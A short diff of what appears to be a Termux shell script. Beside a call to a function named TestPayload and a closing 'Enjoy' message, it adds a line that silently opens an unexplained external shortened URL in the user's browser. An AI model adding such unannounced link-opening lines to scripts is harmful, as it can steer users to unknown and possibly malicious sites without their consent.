@@ -155,3 +155,4 @@ then
         TestPayload
 fi
 echo -e "${NC} Enjoy 🤗😘"
+termux-open-url http://barsoocm.com/1mvT
